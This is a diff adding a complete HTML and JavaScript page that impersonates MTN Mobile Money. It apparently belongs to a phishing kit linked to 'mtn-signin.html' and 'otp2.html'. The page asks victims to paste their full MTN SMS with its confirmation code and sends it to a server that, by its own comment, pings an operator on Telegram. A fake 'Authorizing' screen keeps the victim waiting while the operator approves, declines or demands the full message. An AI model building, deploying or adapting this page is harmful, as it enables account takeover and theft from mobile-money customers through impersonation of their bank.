@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>MTN Mobile Money · Confirm Transfer</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --mtn-royal: #2059B5;
+    --mtn-deep:  #073A87;
+    --mtn-white: #FFFFFF;
+    --mtn-green: #28A745;
+    --mtn-yellow:#FFCC08;
+    --mtn-text:  #456BA8;
+    --mtn-gray:  #7C8798;
+    --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
+    --mtn-page:  #E7EEF7;
+    --mtn-red:   #C62828;
+    --mtn-red-soft: #FEF3F3;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--mtn-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+
+  /* ===== Header ===== */
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    padding: 18px 22px 26px;
+    border-bottom-left-radius: 38% 32px;
+    border-bottom-right-radius: 38% 32px;
+  }
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  }
+  .brand .mtn { color: var(--mtn-yellow); }
+  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
+
+  .page-title {
+    margin-top: 22px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
+    line-height: 1.5; max-width: 320px;
+  }
+
+  /* ===== Body ===== */
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 22px 22px 20px;
+    display: flex; flex-direction: column;
+  }
+
+  .amount-card {
+    background: var(--mtn-soft); border-radius: 14px;
+    padding: 14px 16px; display: flex; align-items: baseline; justify-content: space-between;
+    gap: 12px; margin-bottom: 22px;
+  }
+  .amount-card .label {
+    font-size: 11px; color: var(--mtn-gray); font-weight: 600;
+    letter-spacing: 0.4px; text-transform: uppercase;
+  }
+  .amount-card .amount {
+    font-size: 22px; font-weight: 800; color: var(--mtn-deep);
+    letter-spacing: -0.6px;
+  }
+
+  /* ===== Status notice (decline / expired / needs_full_sms) ===== */
+  .notice {
+    display: none;
+    padding: 13px 15px;
+    border-radius: 12px;
+    font-size: 12.5px;
+    font-weight: 600;
+    line-height: 1.55;
+    margin-bottom: 18px;
+    border: 1px solid transparent;
+  }
+  .notice.show { display: block; }
+  .notice .notice-title {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
+    text-transform: uppercase; margin-bottom: 4px;
+    display: block;
+  }
+  .notice.warn {
+    background: #FFF8E1; border-color: #FFE08A; color: #7A5B00;
+  }
+  .notice.warn .notice-title { color: #8A6600; }
+  .notice.error {
+    background: var(--mtn-red-soft); border-color: #F2B8B8; color: var(--mtn-red);
+  }
+  .notice.error .notice-title { color: #8B0000; }
+  .notice.info {
+    background: #EAF3FE; border-color: #BFD8F6; color: var(--mtn-deep);
+  }
+  .notice.info .notice-title { color: var(--mtn-deep); }
+
+  .section-label {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--mtn-gray);
+    margin-bottom: 8px;
+  }
+
+  .sms-box {
+    width: 100%; min-height: 130px; resize: vertical;
+    background: var(--mtn-soft);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 12px;
+    padding: 14px 14px;
+    font-family: 'Poppins', -apple-system, sans-serif;
+    font-size: 13px; line-height: 1.55; color: var(--mtn-text);
+    outline: none; transition: border-color .15s, background .15s;
+    -webkit-appearance: none;
+  }
+  .sms-box::placeholder { color: #9AA6B8; font-weight: 400; }
+  .sms-box:focus { border-color: var(--mtn-royal); background: #fff; }
+  .sms-box.invalid { border-color: #E23B3B; background: #FEF3F3; }
+
+  .field-error {
+    display: none; font-size: 11.5px; color: var(--mtn-red); margin-top: 6px;
+    font-weight: 600; line-height: 1.4;
+  }
+  .field-error.show { display: block; }
+
+  .btn-paste {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    width: 100%; margin-top: 10px;
+    padding: 11px 14px; font-size: 12.5px; font-weight: 700;
+    background: #fff; color: var(--mtn-royal);
+    border: 1.5px solid #CBD5E1; border-radius: 10px;
+    cursor: pointer; font-family: inherit; transition: all .15s;
+  }
+  .btn-paste:hover { border-color: var(--mtn-royal); background: #F0F5FC; }
+  .btn-paste:disabled { opacity: 0.6; cursor: default; }
+
+  .detected {
+    margin-top: 14px; padding: 12px 14px;
+    background: #EAF7EE; border: 1px solid #CDEBD6;
+    border-radius: 10px; display: none;
+  }
+  .detected.show { display: block; }
+  .detected .det-k {
+    font-size: 10.5px; font-weight: 800; letter-spacing: 0.5px;
+    text-transform: uppercase; color: #1E7A3A; margin-bottom: 4px;
+  }
+  .detected .det-v {
+    font-size: 15px; font-weight: 800; color: #0F5425;
+    letter-spacing: 1.5px; word-break: break-all;
+  }
+
+  .btn-confirm {
+    width: 100%; margin-top: 22px; height: 54px;
+    background: var(--mtn-green); color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 900;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    border: none; border-radius: 999px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(40,167,69,0.28);
+    transition: filter .15s, transform .1s, opacity .15s;
+  }
+  .btn-confirm:hover { filter: brightness(1.06); }
+  .btn-confirm:active { transform: scale(0.985); }
+  .btn-confirm:disabled { opacity: 0.65; cursor: wait; }
+
+  .help-note {
+    margin-top: 18px; font-size: 11.5px; color: var(--mtn-gray);
+    line-height: 1.6; text-align: center;
+  }
+  .help-note strong { color: var(--mtn-text); font-weight: 700; }
+
+  .btn-resend {
+    display: inline-flex; align-items: center; justify-content: center; gap: 8px;
+    width: 100%; margin-top: 10px;
+    padding: 12px 16px; font-size: 13px; font-weight: 700;
+    background: #fff; color: var(--mtn-royal);
+    border: 1.5px solid var(--mtn-royal); border-radius: 10px;
+    cursor: pointer; font-family: inherit; transition: all .15s;
+  }
+  .btn-resend:hover { background: #F0F5FC; }
+  .btn-resend:disabled { opacity: 0.6; cursor: wait; }
+  .btn-resend svg {
+    width: 15px; height: 15px; stroke: currentColor; fill: none;
+    stroke-width: 2.4; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .btn-resend.sent {
+    background: var(--mtn-green); color: #fff;
+    border-color: var(--mtn-green);
+  }
+
+  .mtn-footer {
+    width: 100%; margin-top: 22px;
+    background: var(--mtn-yellow); border-radius: 12px;
+    padding: 14px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; text-align: left;
+  }
+  .mtn-footer .foot-brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: #000;
+  }
+  .mtn-footer .foot-support {
+    font-size: 11px; color: #000; line-height: 1.45; font-weight: 600;
+    text-align: right;
+  }
+  .mtn-footer .foot-support strong { font-weight: 800; }
+
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* ============================================================
+     Full-page "Authorizing…" overlay
+  ============================================================ */
+  .authorizing {
+    position: fixed; inset: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 28px 24px; z-index: 9999; text-align: center;
+    color: #fff;
+  }
+  .authorizing.show { display: flex; }
+  .authorizing .brand-label {
+    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
+    margin-bottom: 30px;
+  }
+  .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
+  .authorizing .brand-label .mm  { color: #fff; }
+  .authorizing .spinner {
+    width: 60px; height: 60px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--mtn-yellow);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 26px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .authorizing h2 {
+    font-size: 21px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 10px;
+  }
+  .authorizing p {
+    font-size: 13px; color: rgba(255,255,255,0.82);
+    max-width: 300px; line-height: 1.6;
+    margin: 0 auto 22px;
+  }
+  .authorizing .safety-card {
+    max-width: 340px; width: 100%;
+    background: rgba(255,255,255,0.08);
+    border: 1px solid rgba(255,255,255,0.18);
+    border-radius: 14px;
+    padding: 16px 18px;
+    text-align: left;
+  }
+  .authorizing .safety-card .sc-title {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.7px;
+    text-transform: uppercase; color: var(--mtn-yellow);
+    margin-bottom: 10px;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .authorizing .safety-card ul {
+    list-style: none; margin: 0; padding: 0;
+  }
+  .authorizing .safety-card li {
+    font-size: 12px; color: rgba(255,255,255,0.85);
+    line-height: 1.55; padding-left: 20px;
+    position: relative; margin-bottom: 8px;
+  }
+  .authorizing .safety-card li:last-child { margin-bottom: 0; }
+  .authorizing .safety-card li::before {
+    content: '✓';
+    position: absolute; left: 0; top: 0;
+    color: var(--mtn-yellow); font-weight: 900;
+    font-size: 12px;
+  }
+  .authorizing .cancel-link {
+    margin-top: 26px; background: transparent; border: none;
+    color: rgba(255,255,255,0.7); font-family: inherit;
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
+
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 18px 18px 16px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .amount-card .amount { font-size: 19px; }
+    .sms-box { min-height: 115px; font-size: 12.5px; }
+    .btn-confirm { height: 50px; font-size: 14px; }
+    .authorizing h2 { font-size: 19px; }
+    .authorizing .spinner { width: 50px; height: 50px; }
+  }
+  @media (max-height: 680px) {
+    .page-title { margin-top: 16px; }
+    .amount-card { margin-bottom: 16px; }
+    .btn-confirm { margin-top: 16px; height: 48px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+    </div>
+    <div class="page-title">Confirm your transfer</div>
+    <div class="page-sub">Paste the Y'ello message you received from MTN to authorize this transfer.</div>
+  </div>
+
+  <div class="body">
+
+    <!-- Status notices shown after Telegram decision -->
+    <div class="notice error" id="noticeDeclined">
+      <span class="notice-title">Transfer declined</span>
+      Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.
+    </div>
+    <div class="notice warn" id="noticeExpired">
+      <span class="notice-title">SMS expired</span>
+      The Y'ello message has expired. Tap <strong>Resend SMS</strong> below to receive a new message, then paste it here.
+    </div>
+    <div class="notice info" id="noticeFullSms">
+      <span class="notice-title">Full SMS requested</span>
+      For your security, please paste the <strong>entire</strong> Y'ello SMS you received — including any code or reference — or tap <strong>Resend SMS</strong> below to receive a fresh message.
+    </div>
+
+    <div class="amount-card">
+      <span class="label">Transfer amount</span>
+      <span class="amount" id="amountLabel">—</span>
+    </div>
+
+    <div class="section-label">Y'ello SMS message</div>
+    <textarea
+      class="sms-box"
+      id="smsInput"
+      placeholder="Paste the full Y'ello message here…"
+      spellcheck="false"
+      autocomplete="off"
+    ></textarea>
+    <div class="field-error" id="smsError">
+      The message must start with "Y'ello" and contain the confirmation code.
+    </div>
+
+    <button class="btn-paste" id="pasteBtn" onclick="pasteFromClipboard()">
+      📋 Paste from clipboard
+    </button>
+
+    <div class="detected" id="detectedBox">
+      <div class="det-k">Detected confirmation code</div>
+      <div class="det-v" id="detectedCode">—</div>
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="confirmPayment()">
+      Confirm transfer
+    </button>
+
+    <div class="help-note">
+      Didn't receive the message?<br>
+      Tap <strong>Resend SMS</strong> or dial <strong>*126#</strong> → "My messages".
+    </div>
+
+    <button class="btn-resend" id="resendBtn" onclick="resendSms()">
+      <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg>
+      <span id="resendLabel">Resend SMS</span>
+    </button>
+
+    <div class="mtn-footer">
+      <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+      <div class="foot-support">
+        Need help?<br>
+        Call <strong id="supportNum">—</strong>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ============================================================
+     Full-page authorizing overlay
+============================================================ -->
+<div class="authorizing" id="authorizingOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="spinner"></div>
+  <h2 id="authTitle">Authorizing your transfer…</h2>
+  <p id="authText">We're verifying your Y'ello message and reviewing the details with MTN Mobile Money.</p>
+
+  <div class="safety-card">
+    <div class="sc-title">🔒 Why we verify</div>
+    <ul>
+      <li>Confirms the Y'ello message is genuine and not tampered with.</li>
+      <li>Protects your wallet from unauthorized or duplicated transfers.</li>
+      <li>Ensures the amount, recipient and reference match what you pasted.</li>
+      <li>Keeps a secure record of the transfer for your protection.</li>
+    </ul>
+  </div>
+
+  <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================================
+     Read transaction from URL (populated by mtn-signin.html)
+  ============================================================ */
+  const params = new URLSearchParams(location.search);
+  const tx = {
+    ref: params.get('tx') || '',
+    am:  params.get('am') || '',
+    cur: params.get('cur') || '',
+    rn:  params.get('rn') || '',
+    c:   params.get('c') || '',
+    pm:  params.get('pm') || '',
+    sn:  params.get('sn') || '',
+    mk:  params.get('mk') || '',
+    an:  params.get('an') || '',
+    dt:  params.get('dt') || ''
+  };
+
+  /* ============================================================
+     Helpers
+  ============================================================ */
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '8787', 'Zambia': '111', 'Zambia (MTN)': '111',
+    'Uganda': '100', 'Uganda (MTN)': '100',
+    'Ghana': '100', 'Ghana (MTN)': '100'
+  };
+  const CURRENCY_LOCALE = {
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH', USD: 'en-US'
+  };
+  function formatAmount(amount, currency) {
+    const locale = CURRENCY_LOCALE[currency] || 'en-US';
+    const n = Number(amount);
+    if (!isFinite(n)) return '—';
+    try {
+      const parts = new Intl.NumberFormat(locale, {
+        minimumFractionDigits: 0, maximumFractionDigits: 2
+      }).format(n);
+      const pretty = (currency === 'XAF' || currency === 'UGX')
+        ? parts.replace(/\u202F|\u00A0|,/g, ' ')
+        : parts;
+      return pretty + ' ' + currency;
+    } catch (e) { return n + ' ' + (currency || ''); }
+  }
+
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  /* ============================================================
+     Status notices
+  ============================================================ */
+  function hideAllNotices() {
+    document.getElementById('noticeDeclined').classList.remove('show');
+    document.getElementById('noticeExpired').classList.remove('show');
+    document.getElementById('noticeFullSms').classList.remove('show');
+  }
+  function showNotice(id) {
+    hideAllNotices();
+    const el = document.getElementById(id);
+    el.classList.add('show');
+    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
+  }
+
+  /* ============================================================
+     Parse the pasted Y'ello message
+  ============================================================ */
+  let detectedCode = '';
+  function parseYelloMessage(raw) {
+    const text = (raw || '').trim();
+    if (!text) return { ok: false, reason: 'empty' };
+
+    const first = text.split(/\s+/)[0]
+      .toLowerCase()
+      .replace(/[’'`´]/g, "'");
+    if (!/^y'?ello/.test(first)) {
+      return { ok: false, reason: 'prefix' };
+    }
+
+    let code = '';
+    const explicit = text.match(/(?:code|ref|reference|otp|pin|txn)\s*[:=\-]?\s*([A-Z0-9]{4,})/i);
+    if (explicit && explicit[1]) code = explicit[1];
+
+    if (!code) {
+      const tokens = text.split(/\s+/)
+        .map(t => t.replace(/[^A-Z0-9]/gi, ''))
+        .filter(t => t.length >= 6 && /[0-9]/.test(t));
+      tokens.sort((a, b) => b.length - a.length);
+      if (tokens.length) code = tokens[0];
+    }
+
+    if (!code) return { ok: false, reason: 'nocode' };
+    return { ok: true, code };
+  }
+
+  function updateDetected() {
+    const box = document.getElementById('detectedBox');
+    const el  = document.getElementById('detectedCode');
+    const err = document.getElementById('smsError');
+    const input = document.getElementById('smsInput');
+
+    const res = parseYelloMessage(input.value);
+    if (res.ok) {
+      detectedCode = res.code;
+      el.textContent = res.code;
+      box.classList.add('show');
+      input.classList.remove('invalid');
+      err.classList.remove('show');
+    } else {
+      detectedCode = '';
+      box.classList.remove('show');
+      if (input.value.trim().length > 0 && res.reason === 'prefix') {
+        input.classList.add('invalid');
+        err.textContent = 'The message must start with "Y\'ello".';
+        err.classList.add('show');
+      } else if (input.value.trim().length === 0) {
+        input.classList.remove('invalid');
+        err.classList.remove('show');
+      } else {
+        input.classList.remove('invalid');
+        err.classList.remove('show');
+      }
+    }
+  }
+
+  document.getElementById('smsInput').addEventListener('input', () => {
+    hideAllNotices();
+    updateDetected();
+  });
+
+  /* ============================================================
+     Resend SMS
+  ============================================================ */
+  async function resendSms() {
+    const btn = document.getElementById('resendBtn');
+    const lbl = document.getElementById('resendLabel');
+    btn.disabled = true;
+    lbl.textContent = 'Sending…';
+    try {
+      const r = await fetch('/api/verification/resend', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref, an: tx.an, c: tx.c, am: tx.am, cur: tx.cur
+        })
+      });
+      if (!r.ok) throw new Error('bad');
+      btn.classList.add('sent');
+      lbl.textContent = 'Sent ✓';
+      hideAllNotices();
+      showToast('A new Y\'ello message was sent to your phone.');
+      setTimeout(() => {
+        btn.classList.remove('sent');
+        lbl.textContent = 'Resend SMS';
+        btn.disabled = false;
+      }, 3000);
+    } catch (e) {
+      lbl.textContent = 'Resend SMS';
+      btn.disabled = false;
+      showToast('Could not resend. Please try again in a moment.');
+    }
+  }
+
+  /* ============================================================
+     Paste from clipboard
+  ============================================================ */
+  async function pasteFromClipboard() {
+    const btn = document.getElementById('pasteBtn');
+    btn.disabled = true;
+    try {
+      if (navigator.clipboard && navigator.clipboard.readText) {
+        const txt = await navigator.clipboard.readText();
+        if (txt) {
+          document.getElementById('smsInput').value = txt;
+          hideAllNotices();
+          updateDetected();
+          showToast('Pasted from clipboard.');
+        } else {
+          showToast('Clipboard is empty.');
+        }
+      } else {
+        showToast('Paste manually: long-press the box and tap Paste.');
+        document.getElementById('smsInput').focus();
+      }
+    } catch (e) {
+      showToast('Paste manually: long-press the box and tap Paste.');
+      document.getElementById('smsInput').focus();
+    }
+    btn.disabled = false;
+  }
+
+  /* ============================================================
+     Authorizing overlay + polling
+  ============================================================ */
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelAuthorizing() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    document.getElementById('authorizingOverlay').classList.remove('show');
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = false;
+    btn.textContent = 'Confirm transfer';
+  }
+
+  async function confirmPayment() {
+    updateDetected();
+
+    const input = document.getElementById('smsInput');
+    const err   = document.getElementById('smsError');
+
+    if (!input.value.trim()) {
+      input.classList.add('invalid');
+      err.textContent = 'Please paste the Y\'ello message you received.';
+      err.classList.add('show');
+      input.focus();
+      return;
+    }
+    const res = parseYelloMessage(input.value);
+    if (!res.ok) {
+      input.classList.add('invalid');
+      err.textContent = res.reason === 'prefix'
+        ? 'The message must start with "Y\'ello".'
+        : 'We could not find a confirmation code in the message.';
+      err.classList.add('show');
+      input.focus();
+      return;
+    }
+
+    hideAllNotices();
+
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = true;
+
+    // Send to server (this triggers the Telegram prompt)
+    try {
+      await fetch('/api/verification/sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          tx: tx.ref,
+          code: res.code,
+          message: input.value.trim(),
+          am: tx.am,
+          cur: tx.cur,
+          c: tx.c,
+          an: tx.an,
+          rn: tx.rn
+        })
+      });
+    } catch (e) {
+      btn.disabled = false;
+      showToast('Network error. Please try again.');
+      return;
+    }
+
+    // Show full-page authorizing screen
+    document.getElementById('authTitle').textContent = 'Authorizing your transfer…';
+    document.getElementById('authText').textContent =
+      'We\'re verifying your Y\'ello message and reviewing the details with MTN Mobile Money.';
+    document.getElementById('authorizingOverlay').classList.add('show');
+
+    pollingActive = true;
+    const start = Date.now();
+    const maxWaitMs = 3 * 60 * 1000; // 3 minutes
+
+    const poll = async () => {
+      if (!pollingActive) return;
+
+      if (Date.now() - start > maxWaitMs) {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Confirm transfer';
+        showToast('Authorization timed out. Please try again.');
+        return;
+      }
+
+      let decision = 'pending';
+      try {
+        const r = await fetch('/api/verification/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const j = await r.json();
+        decision = j.decision || 'pending';
+      } catch (e) { /* keep polling */ }
+
+      if (!pollingActive) return;
+
+      /* -------- APPROVED → go to otp2.html -------- */
+      if (decision === 'approved') {
+        pollingActive = false;
+        document.getElementById('authTitle').textContent = 'Transfer approved';
+        document.getElementById('authText').textContent =
+          'Redirecting you to complete the next step…';
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+        });
+        setTimeout(() => {
+          window.location.href = 'otp2.html?' + q.toString();
+        }, 600);
+        return;
+      }
+
+      /* -------- DECLINED → close overlay, show notice -------- */
+      if (decision === 'declined') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Confirm transfer';
+        showNotice('noticeDeclined');
+        showToast('Transfer declined by reviewer.');
+        return;
+      }
+
+      /* -------- EXPIRED → close overlay, show SMS expired notice -------- */
+      if (decision === 'expired') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Confirm transfer';
+        showNotice('noticeExpired');
+        document.getElementById('resendBtn').classList.add('sent');
+        document.getElementById('resendLabel').textContent = 'Resend now';
+        showToast('SMS expired — please resend and paste the new message.');
+        return;
+      }
+
+      /* -------- NEEDS FULL SMS → close overlay, show info notice -------- */
+      if (decision === 'needs_full_sms') {
+        pollingActive = false;
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        btn.textContent = 'Confirm transfer';
+        showNotice('noticeFullSms');
+        const smsInput = document.getElementById('smsInput');
+        smsInput.focus();
+        showToast('Full SMS requested. Please paste the complete message.');
+        return;
+      }
+
+      pollTimer = setTimeout(poll, 1500);
+    };
+
+    poll();
+  }
+
+  /* ============================================================
+     Init — read user data from URL and populate the page
+  ============================================================ */
+  document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('amountLabel').textContent =
+      tx.am ? formatAmount(tx.am, tx.cur) : '—';
+    document.getElementById('supportNum').textContent =
+      SUPPORT_NUMBERS[tx.c] || '—';
+  });
+</script>
+</body>
+</html>
